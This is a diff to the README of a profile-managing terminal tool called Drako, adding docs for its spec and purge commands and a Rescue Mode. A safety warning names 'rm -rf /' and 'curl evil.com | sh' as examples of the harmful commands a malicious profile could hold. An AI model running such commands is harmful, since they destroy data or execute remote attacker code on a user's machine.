@@ -142,6 +142,39 @@ command = "python3 {assets}/scanner.py"
 ```
 This ensures your profile is portable and works on any machine.
 
+## 🧰 CLI Power Tools
+
+Beyond the TUI, Drako provides CLI commands for advanced management.
+
+### `drako spec <name>`
+Apply a "specification" to bulk-manage your profiles.
+```bash
+drako spec work
+```
+This loads `~/.config/drako/specs/work.toml`. Profiles listed in the spec are **equipped** (moved to visible), and all others are **stored** (moved to `inventory/`). This allows you to switch entire contexts (e.g., "Work Mode" vs "Gaming Mode") in one command.
+
+### `drako purge`
+Safely reset or remove configurations.
+```bash
+# Reset Core config to defaults (moves old config to trash/)
+drako purge --target core
+
+# Remove a specific profile (moves to trash/)
+drako purge --target git
+
+# NUCLEAR OPTION: Delete everything (NO TRASH, NO UNDO)
+drako purge --destroyeverything
+```
+
+## 🚑 Rescue Mode
+
+If your configuration breaks (syntax error, invalid grid), Drako won't crash. It enters **Rescue Mode**.
+
+- **Safe Environment:** A minimal, hardcoded 3x3 grid that always works.
+- **Repair Tools:** Provides buttons to edit `config.toml`, open the config directory, or reset broken profiles.
+- **Manual Access:** You can enter Rescue Mode manually via the **Inventory** (`i`) screen by clicking `[ Rescue Mode ]`.
+- **Exit:** Select "Exit Rescue Mode" or switch to a working profile (`o`/`p`) to return to normal operation.
+
 ## ⚠️ Safety First
 
 - **Summoning is a Trust Operation:** When you summon a profile, you are downloading code that `drako` will execute. A malicious profile could contain harmful commands (e.g., `rm -rf /`, `curl evil.com | sh`).
